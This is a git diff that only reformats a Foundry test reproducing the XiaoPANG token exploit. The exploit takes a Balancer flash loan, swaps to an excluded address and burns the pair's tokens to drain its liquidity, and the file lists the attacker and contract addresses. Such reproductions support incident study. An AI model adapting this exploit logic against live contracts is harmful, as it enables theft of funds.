@@ -4,7 +4,7 @@ pragma solidity ^0.8.15;
 import "../basetest.sol";
 import "./../interface.sol";
 
-// @KeyInfo - Total Lost : 87,906.71
+// @KeyInfo - Total Lost : 87,906.71$
 // Attacker : https://etherscan.io/address/0x43dEbe92A7A32DCa999593fAd617dBD2e6b080a5
 // Attack Contract : https://etherscan.io/address/0xF9729aA0aFEE571E3437528a7e4757FC56407C11
 // Vulnerable Contract : https://etherscan.io/address/0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745
@@ -14,9 +14,9 @@ import "./../interface.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0x15AD98ed61Ea3922b08dD1990dd4CF7f69489745#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.5;
 
 contract XiaoPANGExploit is BaseTestWithBalanceLog {
@@ -29,18 +29,21 @@ contract XiaoPANGExploit is BaseTestWithBalanceLog {
     address vulnToken;
     address WETH;
 
-    uint flashAmt = 1000 ether;
+    uint256 flashAmt = 1000 ether;
 
     IUniswapV2Pair pair = IUniswapV2Pair(uniV2Pair);
     IBalancerVault balancer = IBalancerVault(balancerVault);
     Uni_Router_V2 Router = Uni_Router_V2(uniV2Router);
 
     function setUp() public {
-        vm.createSelectFork('mainnet', vm.parseBytes32('0x8d616edf752e2ccc7f08a923892b0de723a717f0dde0aaba47c90448f778a532'));
+        vm.createSelectFork(
+            "mainnet", vm.parseBytes32("0x8d616edf752e2ccc7f08a923892b0de723a717f0dde0aaba47c90448f778a532")
+        );
         vulnToken = pair.token0();
         fundingToken = pair.token1();
         WETH = fundingToken;
     }
+
     function testExploit() public balanceLog {
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
@@ -56,16 +59,12 @@ contract XiaoPANGExploit is BaseTestWithBalanceLog {
     }
 
     function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
-        IERC20(WETH).approve(uniV2Router,flashAmt);
+        IERC20(WETH).approve(uniV2Router, flashAmt);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            flashAmt,
-            0,
-            getPath(),
-            excludedTargetAddr,
-            block.timestamp
+            flashAmt, 0, getPath(), excludedTargetAddr, block.timestamp
         );
-        require(pair.balanceOf(uniV2Pair) > 2,"Not enough bal");
+        require(pair.balanceOf(uniV2Pair) > 2, "Not enough bal");
         pair.burn(address(this));
-        IERC20(WETH).transfer(msg.sender,flashAmt);
+        IERC20(WETH).transfer(msg.sender, flashAmt);
     }
 }
